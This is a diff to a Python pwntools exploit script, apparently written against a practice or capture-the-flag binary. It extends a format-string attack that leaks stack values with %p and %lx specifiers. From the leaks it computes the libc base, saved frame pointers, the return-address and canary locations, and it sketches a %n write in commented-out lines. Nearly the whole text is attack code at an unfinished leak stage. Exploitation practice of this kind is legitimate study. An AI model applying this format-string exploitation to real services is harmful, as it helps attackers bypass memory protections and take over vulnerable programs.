@@ -39,7 +39,7 @@ continue
 
 io = start()
 
-exploit = f"%3$lx %188$p"
+exploit = f"%3$lx %188$p"+f" %189$p %190$p %191$p %192$p %193$p %194$p %195$p"
 payload = exploit.encode()  
 # io.recvuntil(b'read your input again.')
 io.sendline(payload)
@@ -48,20 +48,36 @@ io.recvuntil(b"Your input is:")
 io.recvline()
 leak_bytes = io.recvline(keepends=False)
 leak = leak_bytes.decode().split(' ')
+for i in range(len(leak)):
+    leaked_int = int(leak[i], 16)
+    print(f"{188+i} and 0x{leaked_int:x}")
+
 leaked_libc = int(leak[0], 16)
 libc_base = leaked_libc - 0x10e077
 print(f"leaked libc_base : 0x{libc_base:x}")
 leaked_rbp = leak[1]
 rbp_func = int(leaked_rbp, 16)
+rbp_main = rbp_func + 80
+print(f"rbp_main : 0x{rbp_main:x}")
 print(f"rbp_func : 0x{rbp_func:x}")
 rbp_func2 = rbp_func - 16
 print(f"rbp_func2 : 0x{rbp_func2:x}")
 rsp_func2 = rbp_func2 - 1456  # 1456 = diff between rbp and rsp of func2
 print(f"rsp_func2 : 0x{rsp_func2:x}")
 rip_func2 = rbp_func2 + 8
-print(f"rip_func2 : {rip_func2:x}")
+print(f"rip_func2 : 0x{rip_func2:x}")
 canary = rbp_func2 - 8
-print(f"canary : {canary:x}")
+print(f"canary : 0x{canary:x}")
+
+# rbp main, rbp func, rbp func2, libc base are correct
+
+# b"%75$nA" 
+# exp2 = b"%188$p  "+  b"%75$nAAAA"
+# io.sendline(exp2)
+# # io.recvuntil(b"Your input is:")
+# print(io.recvline())
+# # print(io.recvline())
+
 
 io.interactive()
 
